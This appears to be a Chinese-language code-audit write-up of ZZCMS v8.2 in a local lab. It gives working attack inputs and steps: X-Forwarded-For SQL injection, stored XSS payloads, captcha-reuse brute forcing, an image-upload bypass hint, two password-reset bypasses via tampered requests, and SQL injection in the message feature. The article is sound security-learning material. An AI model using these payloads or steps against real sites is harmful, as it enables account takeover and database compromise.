##  0x00 前言

**大家好，我是kn0sky，在此我将把我这一次进行的代码审计的发现与收获都记录分析分享一下，笔者初入代码审计不久，审计的方法也比较新手，本文有点倾向于面向代码基础薄弱的童鞋，如果有什么做的不好的地方或者有什么更好的建议，希望大家能够指出，欢迎大家与我私信交流，在此提前谢谢大家啦～**

这次在代码审计前，我了解到要学会追踪数据的流向，这有助于更好的理解漏洞形成的原理，这次我的审计策略是：

> 1.结合业务场景，逐个功能点进行测试，根据输入来追踪变量的最终形态；
>
> 2.搜集网上已有的相关漏洞信息，辅助理解；

##  0x01 准备工作

让代码运行起来：

> ZZCMSv8.2源码（网上可以找到）
>
> VirtualBox + Ubuntu Server + LAMP安装配置过程比较简单，源码里也有详细的说明，在此略过

测试工具：

> PhpStorm
>
> Chromium
>
> Burp Suite Community

###  一个小技巧

这里先分享一个小技巧：当我们要测试sql注入的时候，通过实时查看mysql的日志可以帮助我们更方便的看到sql语句是否成功执行，下面简单讲解一下实时查看日志的操作流程：

1.首先通过SSH连接我们测试用的虚拟机（我用的是Ubuntu）

2.打开mysql的配置文件:/etc/mysql/mysql.conf.d/mysqld.cnf

3.在[mysqld]下面加上这两行，然后保存：

    
    
    general_log_file        = /var/log/mysql/mysql.log
    general_log             = 1

4.通过tail命令进行实时查看

    
    
    sudo tail -f  /var/log/mysql/mysql.log

这样一来，每当执行sql语句之后，这个窗口都会实时显示sql执行情况，如果sql语句报错，则不会显示在日志中，这样来研究测试sql注入就方便多了

##  0x02 审计过程

代码我就不全部截下来了，我把关键部分拿出来分析

###  后台登录页面存在验证码业务逻辑漏洞

![](https://image.3001.net/images/20190929/1569723911_5d901607af61e.png!small)后台登录界面真是非常的简洁，啊

这里验证码通过POST方法提交给logincheck.php页面，该程序处理验证码逻辑的流程非常简单就一行

    
    
    checkyzm($_POST["yzm"]);

调用的这个checkyzm()函数如下：

    
    
    function checkyzm($yzm){
    if($yzm!=$_SESSION["yzm_math"]){showmsg('验证问题答案错误！','back');}
    }

依然表达的非常简单，如果验证码和环境变量中的验证码不一样就弹提示框和退出

这个环境变量是怎么来的呢，我们来看看生成验证码的页面code_math.php这里我省掉了一些无关的代码，我们来看关键部分：

    
    
    <?php
    if(!isset($_SESSION)){session_start();} 
    getCode(100, 20);
    function getCode($w, $h) {
    ......
        $_SESSION['yzm_math'] = $num1 + $num2;
    ......
    }
    session_write_close();
    ?>

调用getCode()函数的时候，会生成一个验证码的环境变量当我们点击刷新验证码的时候，才会调用此函数

综上所述，我们可以得出结论：只要我们不刷新验证码，通过Burp拦截包，输入一个正确的验证码之后，可以一直使用该验证码进行发送各种请求

###  后台登录页面存在SQL注入漏洞

后台页面地址位于<http://192.168.2.100/admin/login.php>，这个login.php是个前端页面，通过把请求发送给logincheck.php来进行登录验证，logincheck.php存在sql注入漏洞

logincheck.php漏洞代码如下：

    
    
    $ip=getip();
    define('trytimes',50);//可尝试登录次数
    define('jgsj',15*60);//间隔时间，秒
    $sql="select * from zzcms_login_times where ip='$ip' and count>='".trytimes."' and unix_timestamp()-unix_timestamp(sendtime)<".jgsj." ";
    $rs = query($sql); 
    $row= num_rows($rs);
    if ($row){
    $jgsj=jgsj/60;
    showmsg("密码错误次数过多，请于".$jgsj."分钟后再试！");
    }

getip()这名称很面熟，bluecms v1.6 sp1的sql注入漏洞就是getip()没过滤参数导致的，这里的getip()也一样

我们先来看getip()代码：

    
    
    function getip(){ 
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
    $ip = getenv("HTTP_CLIENT_IP"); 
    else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
    $ip = getenv("HTTP_X_FORWARDED_FOR"); 
    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
    $ip = getenv("REMOTE_ADDR"); 
    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
    $ip = $_SERVER['REMOTE_ADDR']; 
    else 
    $ip = "unknown"; 
    return($ip); 
    }

这里通过getenv()获取指定HTTP头信息，通过strcasecmp()来进行字符串比较，如果指定HTTP头的长度比字符串unknown大，就返回>0的值，然后直接赋值给变量ip

简而言之，就是没有任何过滤，直接带入变量ip并返回

我们再来看刚才的sql查询语句：

    
    
    $sql="select * from zzcms_login_times where ip='$ip' and count>='".trytimes."' and unix_timestamp()-unix_timestamp(sendtime)<".jgsj." ";

ip变量依旧没有任何过滤，直接代入了查询语句

所以，我们可以通过构造XFF头来进行SQL注入

我们来看一下sql语句之后的代码：

    
    
    $rs = query($sql); 
    $row= num_rows($rs);
    if ($row){
    $jgsj=jgsj/60;
    showmsg("密码错误次数过多，请于".$jgsj."分钟后再试！");

程序将sql语句代入查询，如果查询成功了，则提示15分钟禁止登录，然后退出程序（showmsg()函数会执行exit操作）如果我们再次发送登录请求呢，程序依然会进行sql查询ip登录次数，所以我们构造XFF头进行sql注入不受影响，sql执行报错也不会回显，但通过观察mysql日志可见sql语句确实执行了![](https://image.3001.net/images/20190929/1569724012_5d90166cf14d5.png!small)至于要如何利用，那就要看你的创造力了

###  后台登录页面存在登录逻辑组合漏洞

当我们构造XFF头：

    
    
    X-Forwarded-For: 192.168.2.108'

进行登录的时候，因为加了单引号引起sql语句报错，ip登录次数等信息就不会被记录到数据库，所以返回的页面信息一直不变，如下图所示：

![](https://image.3001.net/images/20190929/1569724055_5d901697f36a1.png!small)

因为sql语句报错（sql报错不会出现在log信息中），所以没有返回结果，不会触发退出程序的操作，所以登录操作的查询依然会进行

将 **验证码逻辑漏洞** \+ **sql语句报错导致可以无限进行登录的逻辑漏洞**
进行组合使用，这里可以进行账号密码爆破，当账号密码对了，就会返回一个不一样页面

![](https://image.3001.net/images/20190929/1569724085_5d9016b5e6050.png!small)

###  后台管理页面网站信息设置功能存在存储型XSS漏洞

登陆完成进入后台之后，我们先来看看第一个功能：网站设置  
![](https://image.3001.net/images/20190929/1569724121_5d9016d9f0deb.png!small)

这个页面有一个功能，保存设置，当我们输入完成相关的设置之后，点击保存即可，保存请求会发送给siteconfig.php页面我们来看一下保存设置相关代码，可设置的内容很多，然而实际上能用得上的很少以下是保存设置的代码，中间我省略了一些无关的参数过滤的部分

    
    
    function SaveConfig(){
    ......
        $fpath="../inc/config.php";
        $fp=fopen($fpath,"w+");//fopen()的其它开关请参看相关函数
        $fcontent="<" . "?php\r\n";
    ......
        $fcontent=$fcontent. "define('sitename','". trim($_POST['sitename'])."') ;//网站名称\r\n";
        $fcontent=$fcontent. "define('siteurl','". trim($_POST['siteurl'])."') ;//网站地址\r\n";
        $fcontent=$fcontent. "define('logourl','". trim($_POST['img'])."') ;//Logo地址\r\n";
        $fcontent=$fcontent. "define('icp','". trim($_POST['icp'])."') ;//icp备案号\r\n";
        $fcontent=$fcontent. "define('webmasteremail','". trim($_POST['webmasteremail'])."') ;//站长信箱\r\n";
        $fcontent=$fcontent. "define('kftel','". trim($_POST['kftel'])."') ;//联系电话\r\n";
        $fcontent=$fcontent. "define('kfmobile','". trim($_POST['kfmobile'])."') ;//手机\r\n";
        $fcontent=$fcontent. "define('kfqq','". trim($_POST['kfqq'])."') ;//QQ\r\n";
        $fcontent=$fcontent. "define('sitecount','". str_replace('"','',str_replace("'",'',stripfxg($_POST['sitecount'],true)))."') ;//网站统计代码\r\n";
        $fcontent=$fcontent. "define('channelzs','". trim($_POST['channelzs'])."') ;//招商显示为\r\n";
        $fcontent=$fcontent. "define('channeldl','". trim($_POST['channeldl'])."') ;//代理显示为\r\n";
    ......
        $fcontent=$fcontent. "define('maximgsize','". trim($_POST['maximgsize']) ."') ;  //图片文件大小限制,单位K\r\n";
        $fcontent=$fcontent. "define('shuiyin','". trim($_POST['shuiyin'])."') ;//是否启用水印功能\r\n";
        $fcontent=$fcontent. "define('syurl','". str_replace('/uploadfiles','uploadfiles',trim($_POST['syurl']))."') ;//水印图片地址\r\n";    
    ......
        fputs($fp,$fcontent);//把替换后的内容写入文件
        fclose($fp);
        echo  "<script>alert('设置成功');location.href='?'</script>";
    }

首先打开文件，然后将参数加到变量$fcontent里，然后作为常量保存到文件里，这里不涉及数据库，不存在SQL注入的问题

主要我们能够有效控制的参数一部分来自基本信息设置，另一部分来自图片上传功能网站基本信息设置：

![](https://image.3001.net/images/20190929/1569724154_5d9016fa12652.png!small)

这里除了网站统计代码，全都只是过滤了首尾的空格，我本来以为这里会有很多存储型XSS呢，结果发现，在这些常量被引用的地方，常量被当成字符串进行输出，所以不存在XSS，除了网站统计代码这个地方我们来看一下网站统计代码的过滤源码：

    
    
    function stripfxg($string,$htmlspecialchars_decode=false,$nl2br=false) {//去反斜杠 
    $string=stripslashes($string);//去反斜杠,不开get_magic_quotes_gpc 的情况下，在stopsqlin中都加上了，这里要去了
    if ($htmlspecialchars_decode==true){
    $string=htmlspecialchars_decode($string);//转html实体符号
    }
    if ($nl2br==true){
    $string=nl2br($string);
    }
    return $string; 
    }

去反斜杠，将尖括号转换成html实体，单双引号转换为空字符，看起来过滤很严格嘛

我们再看之后的逻辑，这是紧接着调用的一个函数的一部分：

    
    
    function showlabel($str){
    global $b;//zsshow需要从zs/class.php获取$b；zxshow从s/class.php获取$b；
    //checkver($str);
    //固定标签
    $channels=array('ad','zs','dl','zx','pp','job','zh','announce','cookiezs','zsclass','keyword','province','sitecount');
    foreach ($channels as $value) {
    if (strpos($str,"{#show".$value.":")!==false){
    $n=count(explode("{#show".$value.":",$str));//循环之前取值
        for ($i=1;$i<$n;$i++){ 
        $cs=strbetween($str,"{#show".$value.":","}");
        if ($cs<>''){$str=str_replace("{#show".$value.":".$cs."}",fixed($cs,$value),$str);}    //$cs直接做为一个整体字符串参数传入，调用时再转成数组遍历每项值
        }    
    }
    ......

这里程序又自己把尖括号给加上了，所以这里array的几个常量如果可控的话，都有可能变成一个标签插入网站中

所以网站统计代码这里存在存储型XSS漏洞，当我们输入：

    
    
    <script>alert`1`</script>

再刷新主页的时候成功弹窗：

![](https://image.3001.net/images/20190929/1569724178_5d901712069d1.png!small)

###  后台管理页面网站信息设置功能存在CSRF漏洞

这一块信息设置除了网站统计代码那里，还有一个地方比较有趣，那就是网站logo地址这里我们可以自己上传图片，也可以输入网址引用网络图片例如：

![](https://image.3001.net/images/20190929/1569724193_5d90172144b33.png!small)

我们来看一下网站对logo地址进行处理的几个代码首先，当我们保存好logourl之后，打开主页的时候，网站会对logourl进行如下处理：

    
    
    $strout=str_replace("{#logourl}",logourl,$strout);

然后作为字符串输出到html标签中

    
    
      <td width="380" height="80"><a href="{#siteurl}"><img src="{#logourl}" border="0" alt="{#sitekeyword}" onload="resizeimg(200,200,this)"></a></td>

当我们请求网站主页的时候，浏览器就会向这个图片的地址发起GET请求，我们将这个图片地址换成其他地址也一样：

![](https://image.3001.net/images/20190929/1569724209_5d9017317e136.png!small)

这里由于对输入的网络地址没有合理过滤，导致存在CSRF漏洞

综上，此处存在GET型CSRF漏洞，至于如何利用，有机会以后再说

此外，这个信息页面还可以从本地上传logo文件，上传文件做了三次过滤：

    
    
    //检查文件大小
    if ($this->max_file_size*1024 < $this->fileName["size"]){
       echo "<script>alert('文件大小超过了限制！最大只能上传 ".$this->max_file_size." K的文件');parent.window.close();</script>";exit;
    }
    //检查文件类型//这种通过在文件头加GIF89A，可骗过
    if (!in_array($this->fileName["type"], $this->uptypes)) {
       echo "<script>alert('文件类型错误，支持的图片类型为：jpg,gif,png,bmp');parent.window.close();</script>";exit;
    }
    //检查文件后缀
    $hzm=strtolower(substr($this->fileName["name"],strpos($this->fileName["name"],".")));//获取.后面的后缀，如可获取到.php.gif
    if (strpos($hzm,"php")!==false || strpos($hzm,"asp")!==false ||strpos($hzm,"jsp")!==false){
    echo "<script>alert('".$hzm."，这种文件不允许上传');parent.window.close();</script>";exit;
    }

（居然在注释里写绕过方法，第一次见。。。。）这里可通过加文件头GIF89A上传图片木马，我不知道该能不能绕过扩展名检测，扩展名经过统一大小写处理取第一个.后面的内容获得，大小写绕过，00截断，pht后缀，都没用，希望有经验的大佬可以指点一二

###  后台信息页面信息发布存在存储型XSS漏洞

![](https://image.3001.net/images/20190929/1569724228_5d9017445c0e8.png!small)

我们直接来看点击修改后网站执行的操作：

    
    
    if ($_REQUEST["action"]=="add" && $_SESSION["admin"]<>''){
    query("INSERT INTO zzcms_zh (bigclassid,title,address,timestart,timeend,content,passed,elite,sendtime)VALUES('$bigclassid','$title','$address','$timestart','$timeend','$content','$passed','$elite','".date('Y-m-d H:i:s')."')");
    }elseif ($_REQUEST["action"]=="modify") {
    query("update zzcms_zh set bigclassid='$bigclassid',title='$title',address='$address',timestart='$timestart',timeend='$timeend',content='$content',passed='$passed',elite='$elite',sendtime='".date('Y-m-d H:i:s')."' where id='$id'");    
    }
    echo  "<script>location.href='zh_manage.php?page=".$page."'</script>";

这里不管是新增还是修改，富文本编辑器的内容都会被HTML实体编码直接存入数据库，这里以展会信息管理为例，我们点击富文本编辑器的源码按钮，写入测试payload:

    
    
    <svg/onload=alert`1`>

我们保存完这条信息之后，我们可以在首页中找到该信息，当我们点开后：

![](https://image.3001.net/images/20190929/1569724268_5d90176ce1ca3.png!small)弹框了，此处存在存储型XSS漏洞

其实除了这一个地方，在该页面上的其他信息发布的富文本输入框里也均存在此问题

###  找回密码页面存在任意用户密码重置逻辑漏洞

![](https://image.3001.net/images/20190929/1569724290_5d901782af8f3.png!small)这个重置密码有两种方式可以实现，修改POST请求，和修改验证码检查响应包

我之前注册了个账号test，密码是1111我现在突然忘了密码是1111，要去找回密码当我完成第一步的时候，点击下一步，我抓包看到请求是这样的：

    
    
    POST /one/getpassword.php HTTP/1.1
    Host: 192.168.2.100
    Content-Length: 88
    Cache-Control: max-age=0
    Origin: http://192.168.2.100
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://192.168.2.100/one/getpassword.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=4qoqvbaru1mvbeh1njjsr9844q; bdshare_firstime=1569335083264; BEEFHOOK=o0ZqvYoil6rauWmSpdpAfp7L0iGwjDdN6YWBLhiBsPGDQnfaO0yJFYizFwAWL0ToLmEGMUoaKyIpb0qo
    Connection: close
    username=test&username2=&action=step1&yzm=20&yzm2=yes&submit=%E4%B8%8B%E4%B8%80%E6%AD%A5

我们提交了很多参数，我们去提交到的那个文件看看源码：

    
    
    if ($action=="step1"){
    $username = isset($_POST['username'])?$_POST['username']:"";
    $_SESSION['username']=$username;
    checkyzm($_POST["yzm"]);
    $rs=query("select mobile,email from zzcms_user where username='" . $username . "' ");
    $row=fetch_array($rs);
    $regmobile=$row['mobile'];
    $regmobile_show=str_replace(substr($regmobile,3,4),"****",$regmobile);
    $regemail=$row['email'];
    $regemail_show=str_replace(substr($regemail,1,2),"**",$regemail);
    }elseif($action=="step2"){
    $strout=str_replace("{step3}","",$strout) ;
    $strout=str_replace("{/step3}","",$strout) ;    
    $strout=str_replace("{step1}".$step1."{/step1}","",$strout) ;
    $strout=str_replace("{step2}".$step2."{/step2}","",$strout) ;
    $strout=str_replace("{step4}".$step4."{/step4}","",$strout) ;
    }elseif($action=="step3" && @$_SESSION['username']!=''){
    $passwordtrue = isset($_POST['password'])?$_POST['password']:"";
    $password=md5(trim($passwordtrue));
    query("update zzcms_user set password='$password',passwordtrue='$passwordtrue' where username='".@$_SESSION['username']."'");
    $strout=str_replace("{step4}","",$strout) ;
    $strout=str_replace("{/step4}","",$strout) ;    
    $strout=str_replace("{step1}".$step1."{/step1}","",$strout) ;
    $strout=str_replace("{step2}".$step2."{/step2}","",$strout) ;
    $strout=str_replace("{step3}".$step3."{/step3}","",$strout) ;
    $strout=str_replace("{#username}",@$_SESSION['username'],$strout) ;
    }

提交参数step为step1的请求的时候，网站会把用户名装到$_SESSION['username']里，然后检查一下其他信息

然后会转到一个需要填写邮箱验证码的页面：

![](https://image.3001.net/images/20190929/1569724307_5d901793df532.png!small)

这里我用的邮箱是编造的，自然不会收到邮件，当然，好像虚拟环境也没装发邮件的服务

当我们随便输入点什么的时候，这时候Burp拦截到了一个请求：

    
    
    GET /ajax/yzm_check_ajax.php?id=1234 HTTP/1.1
    Host: 192.168.2.100
    Accept: text/html, */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36
    Referer: http://192.168.2.100/one/getpassword.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=4qoqvbaru1mvbeh1njjsr9844q; bdshare_firstime=1569335083264; BEEFHOOK=o0ZqvYoil6rauWmSpdpAfp7L0iGwjDdN6YWBLhiBsPGDQnfaO0yJFYizFwAWL0ToLmEGMUoaKyIpb0qo
    Connection: close

我们来看看这个检查验证码是否正确的页面的源码：

    
    
    <?php
    $id=$_GET['id'];//ID值是传过来的$yzm_mobile
    $founderr=0;
    if ($id==''){
    $founderr=1;
    $msg= "请输入验证码";
    }else{
        if(time()-intval(@$_SESSION['yzm_sendtime'])>120){
        $founderr=1;
        $msg="请重新获取验证码";
        }else{
            if ($id!=@$_SESSION['yzm_mobile']){
            $founderr=1;
            $msg="验证码不正确";
            }
        }
    }
        if ($founderr==1){
        echo "<span class='boxuserreg'>".$msg."</span>";
        echo "<script>window.document.userreg.yzm_mobile2.value='no';</script>";
        }else{
        echo "<img src=/image/dui2.png>";
        echo "<script>window.document.userreg.yzm_mobile2.value='yes';</script>";
        echo "<script>document.userreg.yzm_mobile.style.border = '1px solid #dddddd';</script>";
        }
    ?>

输入验证码正确了，founderr=0，否则等于1当founderr为0时，返回yes到前端，为1时，返回no到前端

我们再来看看前端代码：

    
    
    {step2}
    <div class="getpass_step bigbigword">
    <li><span>1</span> 确认帐号</li>
    <li class="current"><span>2</span> 进行安全验证</li>
    <li><span>3</span> 设置新密码</li>
    </div>
    <div style="clear:both"></div>
    <div class="biaodanstyle">
    <form name="userreg" method="post" action="" style="padding:13px" onsubmit="return Checkstep2()">
    <li><span class="lefttext">验证方式</span>

这里调用了Checkstep2()函数：

    
    
    function Checkstep2(){
        if (document.userreg.yzm_mobile.value==""){
        document.userreg.yzm_mobile.style.border = '1px solid #FF0000';
        window.document.getElementById('ts_yzm_mobile').innerHTML="<span class='boxuserreg'>请输入验证码</span>";
        document.userreg.yzm_mobile.focus();    
        return false;
        }
        if (document.userreg.yzm_mobile2.value=="no"){
        document.userreg.yzm_mobile.style.border = '1px solid #FF0000';
        return false;
        }
    }

很显然，当我们验证码检查返回值为no和空的时候，我们不能进入下一步

但是这个返回值是直接发给客户端的，我们可以通过Burp修改一下：

![](https://image.3001.net/images/20190929/1569724327_5d9017a7dfafc.png!small)

这样一来，客户端收到的返回值就不是no也不为空了

然后我们点击下一步：

![](https://image.3001.net/images/20190929/1569724340_5d9017b485209.png!small)

设置好新密码，重新登录，登陆成功

![](https://image.3001.net/images/20190929/1569724351_5d9017bf2aa14.png!small)

这里重置密码其实还有第二种方法可以实现在确认账号那个页面

![](https://image.3001.net/images/20190929/1569724364_5d9017ccda98a.png!small)

输入完信息点击下一步之后，Burp拦截数据包，将数据包发送到Repeater模块中备用，然后再发送当前拦截的数据包进入下一阶段

![](https://image.3001.net/images/20190929/1569724373_5d9017d5bd9a5.png!small)这个时候我们回到Repeater模块中，将数据包里POST提交的参数进行简单的修改:

> 1.修改step=step3
>
> 2.新增password=1234

然后再把数据包发出去

![](https://image.3001.net/images/20190929/1569724389_5d9017e595e26.png!small)

即可完成密码重置

至于为什么要先进入第二步再发包，因为进入到第二步的时候，服务器才会把用户名存到变量中，然后请求第三步让服务器改这个用户名的密码

###  用户登录注册页面存在爆破用户名密码的逻辑漏洞

![](https://image.3001.net/images/20190929/1569724397_5d9017edb646f.png!small)在注册页面，当我们输入一个用户名的时候，会发送一个检查用户名是否被注册的请求：

    
    
    GET /reg/userregcheck.php?action=checkusername&id=haha HTTP/1.1
    Host: 192.168.2.100
    Accept: text/html, */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36
    Referer: http://192.168.2.100/reg/userreg.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=4qoqvbaru1mvbeh1njjsr9844q; bdshare_firstime=1569335083264; BEEFHOOK=o0ZqvYoil6rauWmSpdpAfp7L0iGwjDdN6YWBLhiBsPGDQnfaO0yJFYizFwAWL0ToLmEGMUoaKyIpb0qo
    Connection: close

发送这个请求没有任何限制，所以可以修改参数id来进行用户名爆破

![](https://image.3001.net/images/20190929/1569724409_5d9017f9294f5.png!small)用户登录页面，这个登录请求和后台登录页面的请求是一样的，所以后台登录存在的问题这里也都存在，详情见文章开头

###  用户中心页面存在SQL注入漏洞

![](https://image.3001.net/images/20190929/1569724427_5d90180b4ff3b.png!small)在普通用户登录之后，会进到用户中心，左边那一栏有个群发消息功能，点击邮件/短信内容设置

![](https://image.3001.net/images/20190929/1569724438_5d901816d202b.png!small)这时候我们会看到这个短信内容模板的富文本编辑框，我们随便输入点啥然后点击提交通过拦包我们可以发现，这个请求发给了msg.php文件

    
    
    POST /user/msg.php?action=savedata&saveas=add HTTP/1.1
    Host: 192.168.2.100
    Content-Length: 56
    Cache-Control: max-age=0
    Origin: http://192.168.2.100
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://192.168.2.100/user/msg.php?action=add
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=4qoqvbaru1mvbeh1njjsr9844q; bdshare_firstime=1569335083264; BEEFHOOK=o0ZqvYoil6rauWmSpdpAfp7L0iGwjDdN6YWBLhiBsPGDQnfaO0yJFYizFwAWL0ToLmEGMUoaKyIpb0qo; UserName=test; PassWord=81dc9bdb52d04dc20036dbd8313ed055
    Connection: close
    info_content=666666666666666&Submit=%E6%8F%90%E4%BA%A4

我们来看看相关代码：

    
    
    <?php
    $go=0;
    if (isset($_REQUEST['action'])){
    $action=$_REQUEST['action'];
    }else{
    $action="";
    }
    if (isset($_REQUEST['id'])){
    $id=$_REQUEST['id'];
    }else{
    $id=1;
    }
    checkid($id);
    if ($action=="savedata" ){
        $saveas=trim($_REQUEST["saveas"]);
        $content=stripfxg(rtrim($_POST["info_content"]));
        if ($saveas=="add"){
        query("insert into zzcms_msg (content)VALUES('$content') ");
        $go=1;
        }elseif ($saveas=="modify"){
        query("update zzcms_msg set content='$content' where id=". $_POST['id']." ");
        $go=1;
        }
    }
    ?>

当我们点击提交之后，我们提交的内容存在info_content参数里，这个参数被直接赋值给了$content变量，紧接着$content变量被直接带入sql语句执行

我们来看看我们构造sql语句看是否能正常执行我们发送一个正常的参数（66666666666），然后查看mysql的日志：

    
    
    2019-09-26T12:45:25.703705Z     1744 Connect    kn0sky@localhost on zz using Socket
    2019-09-26T12:45:25.704549Z     1744 Query    SET NAMES 'utf8'
    2019-09-26T12:45:25.704969Z     1744 Init DB    zz
    2019-09-26T12:45:25.705356Z     1744 Query    select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='test' and password='81dc9bdb52d04dc20036dbd8313ed055'
    2019-09-26T12:45:25.705893Z     1744 Query    UPDATE zzcms_user SET loginip = '192.168.2.107' WHERE username='test'
    2019-09-26T12:45:25.706701Z     1744 Query    UPDATE zzcms_user SET lastlogintime = '2019-09-26 20:45:25' WHERE username='test'
    2019-09-26T12:45:25.707546Z     1744 Query    insert into zzcms_msg (content)VALUES('666666666666666')
    2019-09-26T12:45:25.708232Z     1744 Query    select groupname,grouppic from zzcms_usergroup where groupid=(select groupid from zzcms_user where username='test')
    2019-09-26T12:45:25.708840Z     1744 Query    select groupid,totleRMB,startdate,enddate from zzcms_user where username='test'
    2019-09-26T12:45:25.709627Z     1744 Query    select classid from zzcms_zxclass where classname='公司新闻'
    2019-09-26T12:45:25.710282Z     1744 Query    select id from zzcms_dl where saver='test' and looked=0 and del=0 and passed=1
    2019-09-26T12:45:25.710908Z     1744 Query    select id from zzcms_guestbook where saver='test' and looked=0 and passed=1
    2019-09-26T12:45:25.712539Z     1744 Quit

可见，数据库执行了插入操作，数据库执行报错的操作不会显示在日志里，我们构造一个会报错的参数（666666666666666666'），然后查看日志：

    
    
    2019-09-26T12:47:13.694499Z     1745 Connect    kn0sky@localhost on zz using Socket
    2019-09-26T12:47:13.695120Z     1745 Query    SET NAMES 'utf8'
    2019-09-26T12:47:13.695691Z     1745 Init DB    zz
    2019-09-26T12:47:13.696222Z     1745 Query    select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='test' and password='81dc9bdb52d04dc20036dbd8313ed055'
    2019-09-26T12:47:13.696930Z     1745 Query    UPDATE zzcms_user SET loginip = '192.168.2.107' WHERE username='test'
    2019-09-26T12:47:13.697949Z     1745 Query    UPDATE zzcms_user SET lastlogintime = '2019-09-26 20:47:13' WHERE username='test'
    2019-09-26T12:47:13.699087Z     1745 Query    select groupname,grouppic from zzcms_usergroup where groupid=(select groupid from zzcms_user where username='test')
    2019-09-26T12:47:13.699802Z     1745 Query    select groupid,totleRMB,startdate,enddate from zzcms_user where username='test'
    2019-09-26T12:47:13.700696Z     1745 Query    select classid from zzcms_zxclass where classname='公司新闻'
    2019-09-26T12:47:13.701422Z     1745 Query    select id from zzcms_dl where saver='test' and looked=0 and del=0 and passed=1
    2019-09-26T12:47:13.702322Z     1745 Query    select id from zzcms_guestbook where saver='test' and looked=0 and passed=1
    2019-09-26T12:47:13.704513Z     1745 Quit

由此可见，加上单引号之后，sql语句报错，没有执行成功我们构造参数为66666666')#再来验证一下，日志如下：

    
    
    2019-09-26T12:48:37.594592Z     1746 Connect    kn0sky@localhost on zz using Socket
    2019-09-26T12:48:37.595058Z     1746 Query    SET NAMES 'utf8'
    2019-09-26T12:48:37.595459Z     1746 Init DB    zz
    2019-09-26T12:48:37.595888Z     1746 Query    select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='test' and password='81dc9bdb52d04dc20036dbd8313ed055'
    2019-09-26T12:48:37.596379Z     1746 Query    UPDATE zzcms_user SET loginip = '192.168.2.107' WHERE username='test'
    2019-09-26T12:48:37.597443Z     1746 Query    UPDATE zzcms_user SET lastlogintime = '2019-09-26 20:48:37' WHERE username='test'
    2019-09-26T12:48:37.598120Z     1746 Query    insert into zzcms_msg (content)VALUES('666666666666666')#')
    2019-09-26T12:48:37.598947Z     1746 Query    select groupname,grouppic from zzcms_usergroup where groupid=(select groupid from zzcms_user where username='test')
    2019-09-26T12:48:37.599548Z     1746 Query    select groupid,totleRMB,startdate,enddate from zzcms_user where username='test'
    2019-09-26T12:48:37.600286Z     1746 Query    select classid from zzcms_zxclass where classname='公司新闻'
    2019-09-26T12:48:37.600898Z     1746 Query    select id from zzcms_dl where saver='test' and looked=0 and del=0 and passed=1
    2019-09-26T12:48:37.601499Z     1746 Query    select id from zzcms_guestbook where saver='test' and looked=0 and passed=1
    2019-09-26T12:48:37.603705Z     1746 Quit

那条插入语句又重新出现在了日志中

综上，此处存在sql注入漏洞

普通用户登陆进去后的会员中心还存在一些小漏洞，这里就不一一列举了，有兴趣的童鞋可以自行探索交流

##  0x03 总结&感想

SQL注入我本来想用DNSLOG注入来验证的，但是我发现通过tail -f命令去查看mysql日志更方便，所以就偷懒没用DNSLOG注入了

不论是XSS还是SQL注入漏洞，皆来自对用户输入的过滤不充分，甚至有些地方都没有任何过滤，这个CMS在某些业务逻辑上也出现问题很大的漏洞，我前段时间在网上见到过这么一句话：“知识面决定攻击面，知识链决定攻击链”，光发现漏洞的存在是远远不够的，还需要思考实践漏洞是如何利用的，能用来做什么，会造成多大危害等问题

所谓努力，是每一天的积累；所谓成长，是每一天的思考；在这次历时三天的代码审计练习中，虽然审计出来的漏洞很基础，但是收获很多，从刚开始看到这么多代码不知如何下手，到渐渐思考审计的思路与方法，也许，成长，就在于这一点一滴的思考中，在实践中思考，在思考中实践，逐渐积累经验，重视基础知识；学习最重要的不是效率，而是坚持，其次才是高效，哪怕走得很慢，也要不断前进啊，在过程中我们也许就会逐渐发现自己的问题并逐一改正，不浮躁，静下心慢慢来，不断迭代学习方法、思考方式，逐渐找到那个独一无二的自己。

希望我这篇代码审计能够帮到有需要的人，谢谢大家的观看

 ***本文原创作者： Kn0sky，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

